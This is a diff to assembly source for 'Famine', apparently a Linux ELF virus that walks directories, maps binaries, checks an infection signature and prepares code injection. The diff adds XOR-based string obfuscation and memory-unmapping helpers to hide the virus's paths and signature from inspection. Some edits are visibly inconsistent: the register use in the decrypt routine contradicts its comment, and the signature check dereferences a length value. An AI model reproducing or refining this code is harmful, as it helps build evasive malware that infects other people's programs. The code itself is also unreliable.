@@ -1,4 +1,5 @@
-%include "famine.inc"
+; %include "famine.inc"
+%include "obf_file.inc"
 
 bits 64
 default rel
@@ -29,10 +30,18 @@ _start:
 _readDir:
     push rbp
     mov rbp, rsp
+	push rax
+	push rsi
+	call _decrypt_str
+	mov rdi, rax
+	pop rsi
+	pop rax
     sub rsp, famine_size
+	push rsi
 	lea r8, FAM(famine.fd)
 	or qword [r8], -1
     lea r8, FAM(famine.pwdPtr)
+	; mov r10, [rdi]
     mov [r8], rdi
     lea r8, FAM(famine.lenghtPwd)
     mov [r8], rsi
@@ -41,8 +50,9 @@ _readDir:
     xor rdx, rdx
     syscall
     cmp rax, 0
+	pop rsi								; Get the string size back to unmap
 	jl _returnReadir
-    lea rdi, FAM(famine.fd)                         ; enregistre le fd dans la struct
+    lea rdi, FAM(famine.fd)             ; enregistre le fd dans la struct
     mov [rdi], rax
 
     _getDents:
@@ -87,6 +97,8 @@ _readDir:
             mov r8, FAM(famine.total_read)
             mov r12, FAM(famine.total_to_read)
             cmp r8d, r12d                 		; if (total lu >= total getdents)
+			mov rdi, FAM(famine.pwdPtr)
+			mov rsi, FAM(famine.lenghtPwd)
             jge _getDents
             jmp _listFile
 
@@ -192,8 +204,18 @@ _check_file:
 				add r8, [r14 + elf64_phdr.p_filesz]
 				sub r8, signature_len
 				mov r9, [rel signature]
+				mov rdi, r9
+				mov r8, signature_len
+				mov rsi, r8
+				push rax
+				call _decrypt_str
+				mov r9, rax
+				pop rax
 				cmp qword r9, [r8]
 				je _unmap_close_inf
+				mov rdi, r9
+				mov rsi, signature_len
+				call _unmap
 
 			_valid_seg_already_found:
 				mov r9, INF(infection.injection_offset)
@@ -400,9 +422,13 @@ _update_seg_sizes:
 _unmap_close_inf:
 	lea rdi, INF(infection.map_addr)
 	lea rsi, INF(infection.map_size)
+	call _unmap
+	jmp _close_file_inf
+
+_unmap:
 	mov rax, SYS_UNMAP
 	syscall
-	jmp _close_file_inf
+	ret
 
 _close_file_inf:
 	mov	rax, SYS_CLOSE
@@ -417,6 +443,9 @@ _returnReadir:
 	jle	_leave_return
 	mov rax, SYS_CLOSE
 	syscall
+	mov rdi, FAM(famine.pwdPtr)
+	mov rsi, FAM(famine.lenghtPwd)
+	call _unmap
 	or qword FAM(famine.fd), -1
 	jmp _leave_return
 
@@ -444,46 +473,70 @@ _strcpy:
 		; mov byte [rsi + rcx], 0
 		ret
 
-; char *_decrypt_str(rsi: to_decrypt)
+; rax: char *_decrypt_str(rsi: char *to_decrypt, rdi: len)
 _decrypt_str:
 	; rax	== div quotient
 	; rbx	-> to_decrypt
 	; rcx	== counter
 	; rdx	== div modulo
-	; r8	== len to_decrypt
 	; r9	== len key
 	; r10	-> key_char
+	; r11	-> decrypted str (mmap)
+	; r12	== len to_decrypt
 	; rsi	-> key
-	push rax
 	push rbx
 	push rcx
 	push rdx
 	push r8
 	push r9
 	push r10
-	mov rbx, rsi
-	call _strlen
-	mov r8, rax
+	push r11
+	push r12
+	mov rbx, rdi
+	mov r12, rsi
+    xor rdi, rdi                    ; addr = NULL (let kernel choose)
+    mov rdx, 0x03                      ; PROT_READ | PROT_WRITE = 1 | 2 = 3
+    mov r10, 0x22                   ; MAP_PRIVATE | MAP_ANONYMOUS = 0x2 | 0x20 = 0x22
+    mov r8, -1                      ; fd = -1
+    xor r9, r9                      ; offset = 0
+    mov rax, 9                      ; syscall number for mmap
+    syscall
+	cmp rax, 0
+	jl _decrypt_loop_end
+	mov r11, rax
 	lea rsi, key
 	call _strlen
 	mov r9, rax
 	xor rcx, rcx
+	xor rdx, rdx
 	_decrypt_loop:
-		cmp rcx, r8
+		cmp rcx, r12
 		jge	_decrypt_loop_end
-		mov rax, r9
-		div rcx
-		movzx r10, byte [rsi + rdx]	; r10 == key[rdx]
-		xor [rbx + rcx], r10
+		mov rax, rcx
+		xor rdx, rdx
+		cmp rcx, 0
+		jne _no_zero
+		xor rax, rax
+		jmp _end_div
+		_no_zero:
+		div r9
+		_end_div:
+		movzx r10, byte [rsi + rdx]	; r10 == key[rcx % key_len]
+		xor r10b, [rbx + rcx]
+		mov [r11 + rcx], r10b
+		inc rcx
+		jmp _decrypt_loop
 	_decrypt_loop_end:
+		mov rax, r11
+		pop r12
+		pop r11
 		pop r10
 		pop r9
 		pop r8
 		pop rdx
 		pop rcx
 		pop rbx
-		pop rax
-		jmp _leave_return
+		ret
 
 ; debug
 ; strlen(str:rsi)
